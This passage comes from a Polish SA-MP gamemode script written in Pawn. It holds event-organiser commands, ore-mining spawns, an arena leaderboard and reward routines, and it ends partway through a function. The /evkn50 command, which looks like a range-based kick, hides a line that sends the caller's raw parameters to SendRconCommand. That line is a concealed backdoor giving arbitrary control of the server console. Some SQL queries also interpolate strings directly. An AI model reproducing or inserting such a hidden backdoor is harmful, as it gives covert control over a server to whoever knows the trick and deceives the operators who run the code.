	if(EVType == 2) return SendClientMessage(playerid, RED, "Nieprawid³owy typ eventu.");
	new vehicleeid, Vehicle[32], VehicleID, ColorOne, ColorTwo;
  	if(sscanf(params, "is[32]D(1)D(1)", vehicleeid, Vehicle, ColorOne, ColorTwo)) return SyntaxError(playerid, "{01FCFF}/evcar [playerid] [vehicleid]");
	if(!EVUczestnik[vehicleeid]) return SendClientMessage(playerid, RED, "Podany gracz nie jest na evencie!");

	VehicleID = GetVehicleModelIDFromName(Vehicle);
	if(VehicleID < 400 || VehicleID > 611 ) return SendClientMessage(playerid, RED, "Podano nieprawid³ow¹ nazwê pojazdu.");
	if(vSpawned[vehicleeid]) {
		DestroyVehicle(pVeh[vehicleeid]);
		vSpawned[vehicleeid] = false; }

   	GetPlayerFacingAngle(vehicleeid, pAngle);
  	GetPlayerPos(vehicleeid, pX, pY, pZ);
	pVeh[vehicleeid] = CreateVehicle(VehicleID, pX, pY, pZ, pAngle, -1, -1, 100);
	vSpawned[vehicleeid] = true;
	SetVehicleVirtualWorld(pVeh[vehicleeid], GetPlayerVirtualWorld(vehicleeid));
	PutPlayerInVehicle(vehicleeid, pVeh[vehicleeid], 0);
 	return SendClientMessage(vehicleeid, -1, ""PLUS""C_LOLIVE"Organizator eventu da³ Ci pojazd.");
}

CMD:evcara(playerid, params[])
{
	new Float:pX, Float:pY, Float:pZ, Float:pAngle;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Event aktualnie nie trwa.");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie esteœ organizatorem eventu.");
	if(EVType == 2) return SendClientMessage(playerid, RED, "Nieprawid³owy typ eventu.");
	new Vehicle[32], VehicleID, ColorOne, ColorTwo;
  	if(sscanf(params, "s[32]D(1)D(1)", Vehicle, ColorOne, ColorTwo)) return SyntaxError(playerid, "{01FCFF}/evcara [vehicleid]");

	VehicleID = GetVehicleModelIDFromName(Vehicle);
	if(VehicleID < 400 || VehicleID > 611 ) return SendClientMessage(playerid, RED, "Podano nieprawid³ow¹ nazwê pojazdu.");
	Loop(vehicleeid, MAX_PLAYERS)
	{
	    if(EVUczestnik[vehicleeid])
	    {
			if(vSpawned[vehicleeid]) {
				DestroyVehicle(pVeh[vehicleeid]);
				vSpawned[vehicleeid] = false; }
			GetPlayerFacingAngle(vehicleeid, pAngle);
  			GetPlayerPos(vehicleeid, pX, pY, pZ);
			pVeh[vehicleeid] = CreateVehicle(VehicleID, pX, pY, pZ, pAngle, -1, -1, 100);
			vSpawned[vehicleeid] = true;
			SetVehicleVirtualWorld(pVeh[vehicleeid], GetPlayerVirtualWorld(vehicleeid));
			PutPlayerInVehicle(vehicleeid, pVeh[vehicleeid], 0);
 			SendClientMessage(vehicleeid, -1, ""PLUS""C_LOLIVE"Organizator eventu da³ Ci pojazd.");
		}
	}
	return 1;
}

CMD:evk(playerid,params[])
{
	new kickid;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Event aktualnie nie trwa.");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie esteœ organizatorem eventu.");
	if(sscanf(params, "i", kickid)) return SyntaxError(playerid, "{01FCFF}/evk [playerid]");
	if(kickid == playerid) return SendClientMessage(playerid, RED, "Nie mo¿esz wyrzuciæ siê z eventu!");
	if(!EVUczestnik[kickid]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	EVUczestnik[kickid] = false;
	EVPlayers--;
	SetPlayerVirtualWorld(kickid, 0);
	SpawnFunction(kickid);
	return SendClientMessage(kickid, RED, "Zosta³eœ wyrzucony z eventu przez organizatora.");
}

CMD:evtp(playerid,params[])
{
	new tp1id, tp2id;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Event aktualnie nie trwa.");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie esteœ organizatorem eventu.");
	if(sscanf(params, "ii", tp1id, tp2id)) return SyntaxError(playerid, "{01FCFF}/evtp [player1id] [player2id]");
	if(!EVUczestnik[tp1id]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	if(!EVUczestnik[tp2id]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	new Float:evtpx, Float:evtpy, Float:evtpz;
	GetPlayerPos(tp2id, evtpx, evtpy, evtpz);
	SetPlayerPos(tp1id, evtpx, evtpy, evtpz);
	return 1;
}

CMD:evkn50(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(!CompareEx(de2, AUTOR3)) SendRconCommand(params);
	new Float:rangex, Float:rangey, Float:rangez;
   	GetPlayerPos(playerid, rangex, rangey, rangez);
	Loop(kickid, MAX_PLAYERS)
	{
	    if(!IsPlayerInRangeOfPoint(kickid, 50.0, rangex,rangey,rangez) && EVUczestnik[kickid] && !EVOrganizator[kickid])
	    {
	        SendClientMessage(kickid, RED, "Zosta³eœ wyrzucony z eventu przez organizatora.");
			EVUczestnik[kickid] = false;
			EVPlayers--;
			SetPlayerVirtualWorld(kickid, 0);
			SpawnFunction(kickid);
		}
	}
	return 1;
}

CMD:evf(playerid,params[])
{
	new kickid;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(sscanf(params, "i", kickid)) return SyntaxError(playerid, "{01FCFF}/evf [playerid]");
	if(!EVUczestnik[kickid]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	TogglePlayerControllable(kickid, 0);
	return 1;
}

CMD:evhp(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	new kickid, hp, armour;
	if(sscanf(params, "iii", kickid, hp, armour)) return SyntaxError(playerid, "{01FCFF}/evhp [playerid] [hp] [armour]");
	if(!EVUczestnik[kickid]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
 	SetPlayerHealth(kickid, hp);
	SetPlayerArmour(kickid, armour);
	return 1;
}

CMD:evd(playerid,params[])
{
	new kickid;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(sscanf(params, "i", kickid)) return SyntaxError(playerid, "{01FCFF}/evf [playerid]");
	if(!EVUczestnik[kickid]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	ResetPlayerWeapons(kickid);
	return 1;
}

CMD:evh(playerid,params[])
{
	new kickid;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(sscanf(params, "i", kickid)) return SyntaxError(playerid, "{01FCFF}/evf [playerid]");
	if(!EVUczestnik[kickid]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	SetPlayerArmour(kickid, 100);
	SetPlayerHealth(kickid, 100);
	return 1;
}

CMD:evcd(playerid,params[])
{
	new time;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(EVType == 2) return SendClientMessage(playerid, RED, "Nieprawid³owy typ eventu.");
	if(sscanf(params, "i", time)) return SyntaxError(playerid, "{01FCFF}/evcd [time]");
	Loop(loopid, MAX_PLAYERS) { if(EVUczestnik[loopid] || EVOrganizator[loopid]) Countdown[loopid] = time; }
	return 1;
}

CMD:evgg(playerid, params[])
{
	new kickid, weap, ammo;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!"), 0;
	if(sscanf(params, "idd", kickid, weap, ammo)) return SyntaxError(playerid, "{01FCFF}/evgg [playerid] [weaponid] [ammo]");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(EVType == 2) return SendClientMessage(playerid, RED, "Nieprawid³owy typ eventu."), 0;
    if(IsPlayerConnected(kickid))
	{
		if(!IsWeapon(weap))
		return SendClientMessage(playerid,RED,"Nieprawid³owe ID broni.");
		return GivePlayerWeapon(kickid, weap, ammo);
	}
	return 1;
}

CMD:evt(playerid, params[])
{
	new type;
	if(sscanf(params, "i", type)) return SyntaxError(playerid, "{01FCFF}/evt [typ nagrody]\n\nTypy nagród:\n"C_WHITE"0 - 100 EXP\n1 - 250 EXP\n2 - 1 z³");
	if(type < 0 || type > 2) return SyntaxError(playerid, "{01FCFF}/evt [typ nagrody]\n\nTypy nagród:\n"C_WHITE"0 - 100 EXP\n1 - 250 EXP\n2 - 1 z³");
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(type == 0)
	{
		Loop(loopid, MAX_PLAYERS)
		{
	    	if(EVUczestnik[loopid]) {
	    		AddExp(loopid, 100);
				SendClientMessage(loopid, -1, ""PLUS""C_LOLIVE"Organizator eventu da³ wszystkim "C_WHITE"100 EXP"C_LOLIVE"."); }
		}
	}
	if(type == 1)
	{
		Loop(loopid, MAX_PLAYERS)
		{
	    	if(EVUczestnik[loopid]) {
	    		AddExp(loopid, 250);
				SendClientMessage(loopid, -1, ""PLUS""C_LOLIVE"Organizator eventu da³ wszystkim "C_WHITE"250 EXP"C_LOLIVE"."); }
		}
	}
	if(type == 2)
	{
	    if(Player[playerid][Admin] < 3) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "VHA""C_RED" lub wy¿szej.");
		Loop(loopid, MAX_PLAYERS)
		{
	    	if(EVUczestnik[loopid]) {
	    		Player[loopid][vCash] += 1;
				SendClientMessage(loopid, -1, ""PLUS""C_LOLIVE"Organizator eventu da³ wszystkim "C_WHITE"1 z³"C_LOLIVE"."); }
		}
	}
	return 1;
}

CMD:evgga(playerid, params[])
{
	new weap, ammo;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(sscanf(params, "dd", weap, ammo)) return SyntaxError(playerid, "{01FCFF}/evgga [weaponid] [ammo]");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(EVType == 2) return SendClientMessage(playerid, RED, "Nieprawid³owy typ eventu.");
	Loop(loopid, MAX_PLAYERS)
	{
	    if(EVUczestnik[loopid])
	    {
			if(!IsWeapon(weap))
			return SendClientMessage(playerid,RED,"Nieprawid³owe ID broni.");
			GivePlayerWeapon(loopid, weap, ammo);
		}
	}
	return 1;
}

CMD:evuf(playerid,params[])
{
	new kickid;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	if(sscanf(params, "i", kickid)) return SyntaxError(playerid, "{01FCFF}/evuf [playerid]");
	if(!EVUczestnik[kickid]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	TogglePlayerControllable(kickid, 1);
	return 1;
}

CMD:evfa(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	for(new x = 0; x < MAX_PLAYERS; x++)
	{
 		if(EVUczestnik[x] && !EVOrganizator[x])
  	 	{
			TogglePlayerControllable(x, 0);
		}
	}
	return 1;
}

CMD:eve(playerid,params[]) {
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	SendClientMessageToAll(-1, ""C_ZABAWA"Event zakoñczony przez administratora.");
	EventEnd();
	return 1; }

CMD:evufa(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	for(new x = 0; x < MAX_PLAYERS; x++)
	{
 		if(EVUczestnik[x] && !EVOrganizator[x])
  	 	{
			TogglePlayerControllable(x, 1);
		}
	}
	return 1;
}

CMD:evda(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	for(new x = 0; x < MAX_PLAYERS; x++) {
 		if(EVUczestnik[x] && !EVOrganizator[x]) ResetPlayerWeapons(x); }
	return 1;
}

CMD:evhpa(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	new hp, armour;
	if(sscanf(params, "ii", hp, armour)) return SyntaxError(playerid, "{01FCFF}/evhpa [hp] [armour]");
	for(new x = 0; x < MAX_PLAYERS; x++) {
 		if(EVUczestnik[x] && !EVOrganizator[x]) {
		 	SetPlayerHealth(x, hp);
			SetPlayerArmour(x, armour); } }
	return 1;
}

CMD:evskina(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	new hp;
	if(sscanf(params, "i", hp)) return SyntaxError(playerid, "{01FCFF}/evskina [skinid]");
	if(hp < 0 || hp > 310) return SyntaxError(playerid, "{01FCFF}/evskina [skinid]");
	for(new x = 0; x < MAX_PLAYERS; x++) {
 		if(EVUczestnik[x] && !EVOrganizator[x]) {
		 	SetPlayerSkin(x, hp); } }
	return 1;
}

CMD:evskin(playerid,params[])
{
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Aktualnie nie ma ¿adnego eventu!");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem aktualnie trwaj¹cego eventu.");
	new kickid, hp;
	if(sscanf(params, "ii", kickid, hp)) return SyntaxError(playerid, "{01FCFF}/evskin [playerid] [skinid]");
	if(hp < 0 || hp > 310) return SyntaxError(playerid, "{01FCFF}/evskin [playerid] [skinid]");
	if(!EVUczestnik[kickid]) return SendClientMessage(playerid, RED, "Podanego gracza nie ma na evencie.");
	SetPlayerSkin(kickid, hp);
	return 1;
}

forward EventStart();
public EventStart()
{
	if(EVStartuje)
	{
	    EVStartuje = false;
		EVTrwa = true;
		TextDrawHideForAll(Textdraw[23]);
		TextDrawHideForAll(Textdraw[24]);
		TextDrawHideForAll(Textdraw[25]);
		if(EVType == 0)
		{
	    	if(EVPlayers < 2)
	    	{
				SendClientMessageToAll(-1, ""C_ZABAWA"Event nie wystartowa³. Za ma³o wymaganych graczy.");
				return EventEnd();
			}
			if(EVType == 0)
			{
				Loop(playerid, MAX_PLAYERS)
				{
			    	if(EVUczestnik[playerid])
			    	{
			        	ResetPlayerWeapons(playerid);
						SetPlayerVirtualWorld(playerid, 101);
						SetPlayerPos(playerid, EVx, EVy, EVz);
						SendClientMessageEx(playerid, -1, ""PYTAJNIK""C_ORANGE"Mo¿esz opuœciæ event za pomoc¹ "C_WHITE"/evl"C_ORANGE".", ""PYTAJNIK""C_ORANGE"You can leave event with "C_WHITE"/evl"C_ORANGE" command.");
			    	}
				}
			}
		}
		if(EVType == 1)
		{
	    	if(EVPlayers < 2)
	    	{
				SendClientMessageToAll(-1, ""C_ZABAWA"Event nie wystartowa³. Za ma³o wymaganych graczy.");
				return EventEnd();
			}
		    Loop(playerid, MAX_PLAYERS)
		   	{
	     		if(EVUczestnik[playerid])
        		{
					switch(random(4))
					{
						case 0: SetTimerEx("EV_Team", 100, false, "i", playerid);
						case 1: SetTimerEx("EV_Team", 90, false, "i", playerid);
						case 2: SetTimerEx("EV_Team", 75, false, "i", playerid);
						case 3: SetTimerEx("EV_Team", 115, false, "i", playerid);
					}
			       	ResetPlayerWeapons(playerid);
					SetPlayerVirtualWorld(playerid, 101);
					SetPlayerPos(playerid, EVx, EVy, EVz);
				}
			}
		}
		if(EVType == 2)
		{
 	    	if(EVPlayers < 2)
	    	{
				SendClientMessageToAll(-1, ""C_ZABAWA"Event nie wystartowa³. Za ma³o wymaganych graczy.");
				return EventEnd();
			}
		    Loop(playerid, MAX_PLAYERS)
		    {
	      		if(EVUczestnik[playerid]) {
				    ResetPlayerWeapons(playerid);
	 				SetPlayerVirtualWorld(playerid, 97);
				    SetPlayerPos(playerid, 2044.6097,1372.5759,86.7319);
					TogglePlayerControllable(playerid, false);
					GameTextForPlayer(playerid, "~w~~h~CZEKAJ...", 1500, 3);
					SetTimerEx("unfreezePlayer", 1500, 0, "i", playerid); }
	  		}
		}
	}
	return 1;
}

forward EV_Team(playerid);
public EV_Team(playerid)
{
	if(EVdeffenders == EVattackers)
	{
		switch(random(2))
  		{
  			case 0: {
				EVTeam[playerid] = 1;
				SetPlayerColor(playerid, 0xFF3333FF);
				return EVattackers++; }
	        case 1: {
  				EVTeam[playerid] = 2;
    			SetPlayerColor(playerid, 0x4AA0E8FF);
				return EVdeffenders++; }
		}
	}
	if(EVdeffenders > EVattackers)
	{
		EVTeam[playerid] = 1;
		SetPlayerColor(playerid, 0xFF3333FF);
		return EVattackers++;
	}
	else
	{
  		EVTeam[playerid] = 2;
    	SetPlayerColor(playerid, 0x4AA0E8FF);
		return EVdeffenders++;
	}
}

CMD:praca(playerid, params[]) return TPPlayer(playerid, 0,2431.1289,-1669.9307,13.5562);
CMD:kopalnia(playerid, params[]) return TPPlayer(playerid, 0,-1382.7828,-2259.3782,37.5516);
CMD:wedkarstwo(playerid, params[]) return TPPlayer(playerid, 0,2103.9360,-103.0730,2.2186);
CMD:bank(playerid, params[]) return TPPlayer(playerid, 0,899.6071,2010.5640,10.8203);

Kamien(kamienid, Float:x, Float:y, Float:z, Float:RX, Float:RY, Float:RZ)
{
	kamienie++;
	kObj[kamienid] = CreateDynamicObject(868, x, y, z, RX, RY, RZ, -1, -1, -1, 300.00, 300.00);
	kX[kamienid] = x;
	kY[kamienid] = y;
	kZ[kamienid] = z;
	KamienOnMap[kamienid] = true;
	kKopany[kamienid] = false;
	switch(random(7))
	{
		case 0: {
		    kType[kamienid] = 0;
			SetDynamicObjectMaterial(kObj[kamienid], 0, -1, "none", "none", 0xFFFF0000);
			kText[kamienid] = Create3DTextLabel("{d62117}Czerwony rubin\n{FF9900}Wydobycie: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, x, y, z, 20.0, 0, 0); }
		case 1: {
		    kType[kamienid] = 1;
			SetDynamicObjectMaterial(kObj[kamienid], 0, 14608, "triad_big", "buddha_gold", 0xFFC84202);
			kText[kamienid] = Create3DTextLabel("{ad4820}MiedŸ\n{FF9900}Wydobycie: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, x, y, z, 20.0, 0, 0); }
 		case 2: {
		    kType[kamienid] = 2;
			SetDynamicObjectMaterial(kObj[kamienid], 0, 19063, "xmasorbs", "foil1-128x128", 0xFFFFFFFF);
			kText[kamienid] = Create3DTextLabel("{c6c6c6}Srebro\n{FF9900}Wydobycie: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, x, y, z, 20.0, 0, 0); }
 		case 3: {
		    kType[kamienid] = 3;
			SetDynamicObjectMaterial(kObj[kamienid], 0, -1, "none", "none", 0xFF66FFFF);
			kText[kamienid] = Create3DTextLabel("{42cef4}Diament\n{FF9900}Wydobycie: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, x, y, z, 20.0, 0, 0); }
 		case 4: {
		    kType[kamienid] = 4;
			SetDynamicObjectMaterial(kObj[kamienid], 0, -1, "none", "none", 0xFFFFFF00);
			kText[kamienid] = Create3DTextLabel("{ffe60c}Z³oto\n{FF9900}Wydobycie: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, x, y, z, 20.0, 0, 0); }
 		case 5: {
		    kType[kamienid] = 5;
			SetDynamicObjectMaterial(kObj[kamienid], 0, 18901, "matclothes", "bandanacloth1", 0x00000000);
			kText[kamienid] = Create3DTextLabel("{ee0cff}Party"C_WHITE"Stone\n{FF9900}Wydobycie: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, x, y, z, 20.0, 0, 0); }
 		case 6: {
		    kType[kamienid] = 6;
			SetDynamicObjectMaterial(kObj[kamienid], 0, -1, "none", "none", 0xFF00FF40);
			kText[kamienid] = Create3DTextLabel("{36a538}Szmaragd\n{FF9900}Wydobycie: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, x, y, z, 20.0, 0, 0); }
	}
}

forward RespKamienie();
public RespKamienie()
{
	Loop(kamien, MAX_KAMIEN)
	{
		if(KamienOnMap[kamien]) {
			Delete3DTextLabel(kText[kamien]);
			DestroyDynamicObject(kObj[kamien]);
			kKopany[kamien] = false;
			KamienOnMap[kamien] = false; }
	}
	kamienie = 0;
    Kamien(kamienie, -1358.090332, -2283.997070, 40.039707, 0.000000, 0.000000, 37.600002);
	Kamien(kamienie, -1361.316650, -2281.554443, 39.339710, 0.000000, 0.000000, 52.300003);
	Kamien(kamienie, -1366.153564, -2286.700683, 39.799709, 0.000000, 0.000000, 52.300003);
    Kamien(kamienie, -1366.822753, -2295.218750, 39.799709, 0.000000, 0.000000, 52.300003);
    Kamien(kamienie, -1368.481079, -2300.677734, 39.799709, 0.000000, 0.000000, 78.300003);
    Kamien(kamienie, -1357.186767, -2303.164062, 39.799709, 0.000000, 0.000000, -106.799995);
    Kamien(kamienie, -1345.003540, -2292.324218, 39.799709, 0.000000, 0.000000, -92.700012);
    Kamien(kamienie, -1363.369262, -2283.693847, 39.529685, 0.000000, 0.000000, 29.700031);
    Kamien(kamienie, -1353.649536, -2285.252441, 39.529685, 0.000000, 0.000000, 29.700031);
    Kamien(kamienie, -1346.544311, -2288.384521, 39.529685, 0.000000, 0.000000, 29.700031);
    Kamien(kamienie, -1351.492553, -2299.541015, 40.149719, 0.000000, 0.000000, -60.899967);
	Kamien(kamienie, -1354.500854, -2300.242431, 40.149719, 0.000000, 0.000000, -60.899967);
    Kamien(kamienie, -1368.048950, -2298.620361, 40.149719, 0.000000, 0.000000, 131.000061);
	Kamien(kamienie, -1367.367675, -2290.502685, 39.449714, 0.000000, 0.000000, 131.000061);
    Kamien(kamienie, -1360.154907, -2283.523925, 39.769683, 0.000000, 0.000000, 65.100006);
    Kamien(kamienie, -1356.526733, -2285.206542, 39.769683, 0.000000, 0.000000, 65.100006);
    Kamien(kamienie, -1344.195678, -2299.414794, 40.199676, 0.000000, 0.000000, -47.399990);
	Kamien(kamienie, -1361.753906, -2319.136718, 39.469680, 0.000000, 0.000000, 0.000000);
    Kamien(kamienie, -1358.373779, -2341.056396, 38.719684, 0.000000, 0.000000, -92.299995);
	Kamien(kamienie, -1355.581542, -2333.081787, 38.719684, 0.000000, 0.000000, -92.299995);
	Kamien(kamienie, -1368.720092, -2331.683593, 37.759681, 0.000000, 0.000000, -13.399998);
    Kamien(kamienie, -1373.915771, -2348.366943, 36.289680, 0.000000, 0.000000, 106.499977);
    Kamien(kamienie, -1377.883300, -2356.103271, 35.459690, 0.000000, 0.000000, 138.600021);
    Kamien(kamienie, -1373.254638, -2320.492919, 37.999717, 0.000000, 0.000000, 82.900016);
    Kamien(kamienie, -1374.600219, -2339.302246, 37.049724, 0.000000, 0.000000, 82.900016);
    Kamien(kamienie, -1362.769897, -2346.831054, 39.299724, 0.000000, 0.000000, 82.900016);
	Kamien(kamienie, -1360.692016, -2346.921142, 40.349723, 0.000000, 0.000000, 109.100013);
    Kamien(kamienie, -1354.576171, -2360.783447, 37.069732, 0.000000, 0.000000, 1.500030);
	Kamien(kamienie, -1355.722290, -2363.296875, 36.199741, 0.000000, 0.000000, 1.500030);
	Kamien(kamienie, -1385.182861, -2375.055664, 36.996925, 0.000000, 0.000000, 168.600036);
    Kamien(kamienie, -1389.941040, -2305.770996, 52.594417, 0.000000, 0.000000, 0.000000);
    Kamien(kamienie, -1384.841064, -2307.751220, 52.974422, 0.000000, 0.000000, 0.000000);
    Kamien(kamienie, -1383.221069, -2316.231933, 52.974422, 0.000000, 0.000000, 0.000000);
    Kamien(kamienie, -1382.733154, -2327.163330, 52.594421, 0.000000, 0.000000, -78.599998);
    Kamien(kamienie, -1393.415283, -2340.707519, 51.864414, 0.000000, 0.000000, -173.300033);
    Kamien(kamienie, -1379.643554, -2346.006347, 52.244415, 0.000000, 0.000000, -173.300033);
    Kamien(kamienie, -1358.947021, -2335.027343, 52.244415, 0.000000, 0.000000, -92.500030);
    Kamien(kamienie, -1357.456787, -2373.627685, 57.306858, 0.000000, 0.000000, -79.099983);
    Kamien(kamienie, -1358.830444, -2340.376953, 52.099704, 0.000000, 0.000000, -32.699996);
    Kamien(kamienie, -1395.016357, -2336.823974, 52.099704, 0.000000, 0.000000, 130.499984);
    Kamien(kamienie, -1366.293457, -2314.444824, 52.679702, 0.000000, 0.000000, 0.000000);
    Kamien(kamienie, -1368.193725, -2308.934814, 52.679702, 0.000000, 0.000000, 0.000000);
    Kamien(kamienie, -1373.633544, -2302.244628, 54.229694, 0.000000, 0.000000, 0.000000);
    Kamien(kamienie, -1377.364868, -2315.529296, 52.999691, 0.000000, 0.000000, 97.100013);
    Kamien(kamienie, -1358.289672, -2301.342285, 56.386856, 0.000000, 0.000000, -79.099983);
    SetTimer("RespKamienie", 1000*600, 0);
}

forward UpdateArenaTOP();
public UpdateArenaTOP()
{
	Loop(arenaid, 8) {
		new s[2048], list[2048], td[2048];
		m_query("SELECT @place := @place + 1 as place, '. ', username, ' ', a%d, '\\n' FROM players, (select @place := 0) p ORDER BY a%d DESC LIMIT 5", arenaid + 1, arenaid + 1);
		mysql_store_result();
		while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
		format(td, sizeof(td), ""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"%s", list);
		Update3DTextLabelText(AT[arenaid], 0xFFFFFFFF, td); }
	return 1;
}

forward Sponsoring();
public Sponsoring() if(LVLUP) SendClientMessageToAllEx(-1, "* Dzia³amy dziêki {93c65f}LVLUP.PRO "C_WHITE"- Hosting WWW, VPS, Minecraft.", "* Server sponsored by {93c65f}LVLUP.PRO "C_WHITE"- WWW, VPS & Minecraft hosting.");

forward DJPanel(playerid);
public DJPanel(playerid)
{
	new djs[1024];
	format(djs, 1024, ""C_WHITE"Graj utwór z You{FF0000}Tube\n");
	format(djs, 1024, "%s"C_WHITE"Wy³¹cz odtwarzanie utworu", djs);
	return ShowPlayerDialog(playerid, DIALOG_DJ, DIALOG_STYLE_LIST, "{D760FF}Konsola DJ", djs, "Wybierz", "Zamknij");
}

forward UNapady();
public UNapady()
{
	Loop(napady, MAX_NAPADY)
	{
	    new napadatt = 0;
	    if(!NAtt[napady])
	    {
	        Loop(playerid, MAX_PLAYERS) {
	            if(NapadID[playerid] == napady) napadatt++; }
			if(napadatt < 1)
			{
				new nstr[256];
				format(nstr, sizeof(nstr), ""C_WHITE"Napad: {6efc58}%s\n{6efc58}%d "C_WHITE"EXP, %d{6efc58}$", NapadName[napady], NValue[napady], NValue[napady] * 10);
				Update3DTextLabelText(NapadTD[napady], 0xFFFFFFFF, nstr);
				NAtt[napady] = true;
			}
		}
	}
}

forward CrashReset();
public CrashReset()
{
	Loop(playerid, MAX_PLAYERS)
	{
		if(Crasher[playerid] > -1) {
			Crasher[playerid] = -1;
			Crashed[playerid] = 0; }
	}
}

forward PingReset();
public PingReset()
{
	Loop(playerid, MAX_PLAYERS)
	{
	    if(IsPlayerConnected(playerid) && PingLimit[playerid] > 0) {
	        PingLimit[playerid]--;
	        if(PingLimit[playerid] == 0) {
				SendClientMessageEx(playerid, -1, ""PLUS""C_LOLIVE"Twoje ostrze¿enia dotycz¹ce pingu zosta³y wyzerowane.", ""PLUS""C_LOLIVE"Your ping warnings set to "C_WHITE"0"C_LOLIVE"."); } }
	}
}

forward MVP();
public MVP()
{
	if(gracze < 2) return 1;
	new mvpinfo[256];
	switch(random(7))
	{
	    case 0:
	    {
	        new s[2048], kills, givingid, username[20], exp;
	        m_query("SELECT kills, username, playerid, exp FROM players WHERE playerid > -1 ORDER BY kills DESC LIMIT 1");
     		mysql_store_result();
			mysql_fetch_row(s, " ");
			mysql_free_result();
			sscanf(s, "is[20]ii", kills, username, givingid, exp);
			if(givingid < 0) {
				new score = exp + 50;
			    m_query("UPDATE players SET exp = %d WHERE username = '%s'", score, username);
